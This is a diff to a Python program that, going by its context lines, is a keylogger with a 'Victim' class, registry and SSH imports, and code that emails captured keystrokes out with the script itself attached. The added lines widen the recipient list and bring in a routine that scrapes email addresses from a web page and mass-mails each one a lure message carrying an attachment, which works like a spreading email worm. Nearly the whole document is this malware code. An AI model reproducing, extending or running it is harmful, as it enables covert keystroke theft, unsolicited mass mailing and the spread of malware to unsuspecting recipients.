@@ -7,7 +7,9 @@ import subprocess
 import keyboard
 import winreg
 import paramiko
-
+import requests
+from bs4 import BeautifulSoup
+import re
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
@@ -21,11 +23,11 @@ class EmailSender:
         self.username = username
         self.password = password
 
-    def send_email_with_attachment(self, subject, message, attachment_path):
+    def send_email_with_attachment(self, subject, message, attachment_path, recipients):
         # Create a multipart message
         msg = MIMEMultipart()
         msg['From'] = self.username
-        msg['To'] = self.username  # Send the email to yourself
+        msg['To'] = ", ".join(recipients)
         msg['Subject'] = subject
 
         # Add message body
@@ -100,7 +102,7 @@ class Victim:
         message = f'Keystrokes captured: {keystrokes}'
         attachment_path = os.path.abspath(__file__)  # Attach the current script file
 
-        email_sender.send_email_with_attachment(subject, message, attachment_path)
+        email_sender.send_email_with_attachment(subject, message, attachment_path, [self.username])
 
     def start_recording(self):
         recorded_keystrokes = []
@@ -211,3 +213,98 @@ if __name__ == "__main__":
     victim = Victim(victim_ip, victim_port)
     victim.connect_to_server()
     victim.online_interaction()
+
+# Email scraping and sending
+
+import requests
+from bs4 import BeautifulSoup
+import re
+import smtplib
+import os
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+
+class EmailSender:
+    def __init__(self, smtp_server, smtp_port, username, password):
+        self.smtp_server = smtp_server
+        self.smtp_port = smtp_port
+        self.username = username
+        self.password = password
+
+    def send_email_with_attachment(self, subject, message, attachment_path, recipients):
+        # Create a multipart message
+        msg = MIMEMultipart()
+        msg['From'] = self.username
+        msg['To'] = ", ".join(recipients)
+        msg['Subject'] = subject
+
+        # Add message body
+        msg.attach(MIMEText(message, 'plain'))
+
+        # Add attachment
+        attachment_filename = os.path.basename(attachment_path)
+        with open(attachment_path, "rb") as attachment_file:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(attachment_file.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f"attachment; filename= {attachment_filename}")
+            msg.attach(part)
+
+        # Send the email
+        try:
+            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
+                server.login(self.username, self.password)
+                server.send_message(msg)
+            print("Email sent successfully!")
+        except smtplib.SMTPException as e:
+            print("Failed to send email. Error:", str(e))
+
+
+def scrape_email_addresses(url):
+    email_addresses = []  # List to store the email addresses
+
+    # Send a GET request to the webpage
+    response = requests.get(url)
+    if response.status_code == 200:
+        # Create BeautifulSoup object to parse the HTML content
+        soup = BeautifulSoup(response.content, 'html.parser')
+
+        # Find all email addresses using regular expressions
+        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b'
+        found_emails = re.findall(email_pattern, soup.get_text())
+
+        # Remove duplicate email addresses and add them to the list
+        for email in found_emails:
+            if email not in email_addresses:
+                email_addresses.append(email)
+
+    else:
+        print(f"Failed to fetch webpage: {response.status_code}")
+
+    return email_addresses
+
+
+def send_emails_to_addresses(emails):
+    # Set your email account credentials and SMTP server information here
+    smtp_server = "your_smtp_server"
+    smtp_port = 587
+    username = "your_email@example.com"
+    password = "your_password"
+
+    email_sender = EmailSender(smtp_server, smtp_port, username, password)
+
+    subject = "Check out this website!"
+    message = "Hey, I found this cool website with interesting content. Check it out!"
+
+    for email in emails:
+        email_sender.send_email_with_attachment(subject, message, "path_to_attachment", [email])
+
+
+# Example usage
+webpage_url = 'https://www.example.com'  # Replace with the actual webpage URL
+emails = scrape_email_addresses(webpage_url)
+send_emails_to_addresses(emails)
+
